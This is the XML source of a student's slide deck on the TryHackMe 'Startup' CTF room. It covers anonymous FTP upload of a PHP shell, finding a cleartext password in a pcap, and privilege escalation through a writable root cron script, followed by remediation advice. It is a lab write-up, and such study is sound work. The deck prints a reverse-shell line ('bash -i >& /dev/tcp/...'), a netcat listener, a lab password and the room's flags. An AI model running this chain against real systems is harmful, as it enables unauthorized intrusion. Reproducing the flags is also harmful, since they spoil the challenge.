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9144"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F2937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005840"/>
            <a:ext cx="64008" cy="301752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005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PENETRATION TEST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31520" y="17556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00FF9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3152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— TryHackMe CTF Room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3127248"/>
            <a:ext cx="4114800" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B949E">
              <a:alpha val="60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Shoukat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 — British Education &amp; Training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877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May 2026  |  Class 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005840"/>
            <a:ext cx="219456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1051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1298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10.113.168.217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16276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· Apache · OpenSSH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Educational / CTF Context  |  Ethical Hacking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RECONNAISSANCE &amp; INITIAL ACCESS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RESULTS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374904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— vsftpd 3.0.3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7190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374904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221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— OpenSSH 7.2p2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374904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92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Apache 2.4.18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273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896112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987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 CHAIN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444752"/>
            <a:ext cx="329184" cy="329184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44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14264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FTP Login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682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required — world-writable /ftp dir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329184" cy="329184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94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1762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PHP Shell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432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shell.ph → shell.php to bypass filters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944368"/>
            <a:ext cx="329184" cy="329184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9260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Trigger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http://10.113.168.217/files/ftp/shell.php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694176"/>
            <a:ext cx="329184" cy="329184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694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36758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Received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uid=33(www-data) on Netcat port 4444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Shoukat  |  BETS  |  Startup THM Room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POST-EXPLOITATION &amp; LATERAL MOVEMENT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87552" y="1207008"/>
            <a:ext cx="36576" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00C5FF">
              <a:alpha val="70000"/>
            </a:srgbClr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097280"/>
            <a:ext cx="402336" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00C5FF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00C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97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060704"/>
            <a:ext cx="7132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1097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www-data Shell Active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3533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as Apache user (uid=33). Began enumeration of filesystem.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1865376"/>
            <a:ext cx="7132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19019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File Discovered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15798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/incidents/suspicious.pcapng — copied to web root for download &amp;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" y="2706624"/>
            <a:ext cx="402336" cy="402336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7066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2670048"/>
            <a:ext cx="7132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8760" y="27066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 Cleartext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296265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contained lennie's password: c4ntg3t3n0ughsp1c3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" y="3511296"/>
            <a:ext cx="402336" cy="40233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511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3474720"/>
            <a:ext cx="7132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08760" y="35112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Flag Captured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76732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lennie → cat /home/lennie/user.txt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THM{03ce3d619b80ccbfb3b7fc81e46c0e79}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4233672"/>
            <a:ext cx="7132320" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2333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42702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Ingredient: </a:t>
            </a:r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found in /recipe.txt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Shoukat  |  BETS  |  Startup THM Room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PRIVILEGE ESCALATION → ROOT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160520" cy="3063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749040" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2333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081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root-owned, run by cron as root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3749040" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2333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/etc/print.sh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planner.sh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749040" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2333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249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of print.sh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44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lennie (writable by us!)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7490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"bash -i &gt;&amp; /dev/tcp/10.113.174.222/5555 0&gt;&amp;1" &gt; /etc/print.sh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896112"/>
            <a:ext cx="4160520" cy="3063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987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353312"/>
            <a:ext cx="374904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17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nc -lvnp 5555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received on 10.113.168.217
</a:t>
            </a:r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root@startup:~#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
</a:t>
            </a:r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487168"/>
            <a:ext cx="3749040" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2333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FLAG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8529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THM{f963aaa6a430f210222158ae15c3d76d}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18211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root compromise achieved via cron misconfiguration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Shoukat  |  BETS  |  Startup THM Room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FINDINGS &amp; REMEDIATION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23544"/>
            <a:ext cx="1188720" cy="2743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235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9052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FTP + Writable Dir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905256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90525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anon FTP. Restrict upload permissions.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36192"/>
            <a:ext cx="85039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91640"/>
            <a:ext cx="1188720" cy="2743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6733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Script Owned by Low-Priv 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67335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6733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root:root /etc/print.sh &amp;&amp; chmod 700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85039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59736"/>
            <a:ext cx="1188720" cy="274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24414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Credentials in PCAP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2441448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24414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SFTP/HTTPS. Rotate exposed creds.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72384"/>
            <a:ext cx="85039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27832"/>
            <a:ext cx="1188720" cy="274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27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320954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Dir Exposed on Web Root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3209544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320954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FTP storage from Apache web root.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850392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995928"/>
            <a:ext cx="118872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995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45920" y="39776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Kernel &amp; Services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3977640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0" y="39776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OS and application security patches.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Shoukat  |  BETS  |  Startup THM Room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THM Penetration Test</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Ahmad Shoukat</dc:creator>
  <cp:lastModifiedBy>Ahmad Shoukat</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-04T07:38:43Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-04T07:38:43Z</dcterms:modified>
</cp:coreProperties>
</file>